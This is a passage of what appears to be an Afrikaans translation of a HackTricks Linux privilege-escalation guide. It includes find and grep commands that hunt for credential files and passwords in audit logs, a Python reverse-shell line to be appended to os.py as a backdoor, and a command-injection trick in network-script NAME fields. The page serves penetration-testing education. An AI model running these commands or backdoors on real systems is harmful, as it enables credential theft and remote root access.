find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB lêers
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml lêers
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Versteekte lêers
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Skripte/Binaries in PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web-lêers**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Rugsteunkopieë**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Bekende lêers wat passwords bevat

Lees die code van [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), dit soek na **verskeie moontlike lêers wat passwords kan bevat**.\
**Nog 'n interessante tool** wat jy hiervoor kan gebruik is: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) wat 'n open source-toepassing is wat gebruik word om baie passwords wat op 'n plaaslike rekenaar vir Windows, Linux & Mac gestoor is, uit te onttrek.

### Logs

As jy logs kan lees, kan jy dalk **interessante/vertroulike inligting daarin vind**. Hoe vreemder die log is, hoe interessanter sal dit waarskynlik wees.\
Ook kan sommige "**bad**" gekonfigureerde (backdoored?) **audit logs** jou toelaat om **passwords op te teken** binne audit logs soos verduidelik in hierdie post: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Om **logs te lees** sal die groep [**adm**](interesting-groups-linux-pe/index.html#adm-group) baie nuttig wees.

### Shell-lêers
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Jy moet ook kyk na lêers wat die woord "**password**" in hul **naam** of in die **inhoud** bevat, en ook kyk vir IPs en emails in logs, of hashes regexps.\
Ek gaan nie hier uiteensit hoe om dit alles te doen nie, maar as jy belangstel kan jy die laaste kontroles wat [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) uitvoer, nagaan.

## Skryfbare lêers

### Python library hijacking

As jy weet van **waar** 'n python script gaan uitgevoer word en jy **kan binne daardie vouer skryf** of jy kan **modify python libraries**, kan jy die OS library wysig en dit backdoor (as jy kan skryf waar die python script uitgevoer gaan word, kopieer en plak die os.py library).

Om die **backdoor the library** te doen, voeg net aan die einde van die os.py library die volgende reël by (verander IP en PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate eksploitasie

'n kwesbaarheid in `logrotate` laat gebruikers met **skryfregte** op 'n loglêer of sy ouerdirektore potensieel verhoogde privileges verkry. Dit is omdat `logrotate`, wat dikwels as **root** loop, gemanipuleer kan word om arbitrêre lêers uit te voer, veral in gidse soos _**/etc/bash_completion.d/**_. Dit is belangrik om nie net die toestemmings in _/var/log_ na te gaan nie, maar ook in enige gids waar logrotasie toegepas word.

> [!TIP]
> Hierdie kwesbaarheid geld vir `logrotate` weergawes `3.18.0` en ouer

Meer gedetailleerde inligting oor die kwesbaarheid is op hierdie bladsy te vinde: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Jy kan hierdie kwesbaarheid uitbuit met [**logrotten**](https://github.com/whotwagner/logrotten).

Hierdie kwesbaarheid is baie soortgelyk aan [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** dus wanneer jy agterkom dat jy logs kan verander, kyk wie daardie logs bestuur en kyk of jy privileges kan eskaleer deur die logs met symlinks te vervang.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Kwesbaarheidsverwysing:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

As, om watter rede ook al, 'n gebruiker in staat is om **skryf** 'n `ifcf-<whatever>`-skrip na _/etc/sysconfig/network-scripts_ te plaas **of** 'n bestaande een te **aanpas**, dan is jou **system is pwned**.

Netwerkskripte, byvoorbeeld _ifcg-eth0_, word gebruik vir netwerkverbindinge. Hulle lyk presies soos .INI lêers. Hulle word egter op Linux deur Network Manager (dispatcher.d) \~sourced\~.

In my geval word die `NAME=` attribuut in hierdie netwerkskripte nie korrek hanteer nie. As jy **wit/spasie in die naam het, probeer die stelsel die deel ná die wit/spasie uit te voer**. Dit beteken dat **alles ná die eerste spasie as root uitgevoer word**.

Byvoorbeeld: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Let op die leë spasie tussen Network en /bin/id_)

### **init, init.d, systemd, en rc.d**

Die gids `/etc/init.d` huisves **skripte** vir System V init (SysVinit), die **klasieke Linux service management stelsel**. Dit sluit skripte in om `start`, `stop`, `restart`, en soms `reload` dienste uit te voer. Hierdie kan direk uitgevoer word of deur simboliese skakels wat in `/etc/rc?.d/` gevind word. 'n Alternatiewe pad in Redhat stelsels is `/etc/rc.d/init.d`.

Aan die ander kant is `/etc/init` geassosieer met **Upstart**, 'n nuwer **diensbestuur** wat deur Ubuntu bekendgestel is, wat konfigurasielêers vir diensbestuurtake gebruik. Ten spyte van die oorskakeling na Upstart word SysVinit-skripte steeds langs Upstart-konfigurasies gebruik weens 'n kompabiliteitslaag in Upstart.

**systemd** tree as 'n moderne inisialiserings- en diensbestuurder, wat gevorderde funksies bied soos op-aanvraag daemon-opstart, automount-bestuur, en stelseltoestand-snapshots. Dit orden lêers in `/usr/lib/systemd/` vir verspreidingspakkette en `/etc/systemd/system/` vir administrateurwysigings, wat die stelseladministrasieproses vereenvoudig.

## Ander truuks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks koppel gewoonlik 'n syscall om bevoorregte kernelfunksionaliteit aan 'n userspace manager bloot te lê. Swak manager-verifikasie (bv. signature checks gebaseer op FD-order of swak wagwoordskemas) kan 'n plaaslike app in staat stel om die manager na te boots en na root op reeds-gerootte toestelle op te skaal. Leer meer en eksploitasiendetails hier:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Gereedskap

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (fisiese toegang):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

{{#include ../../banners/hacktricks-training.md}}
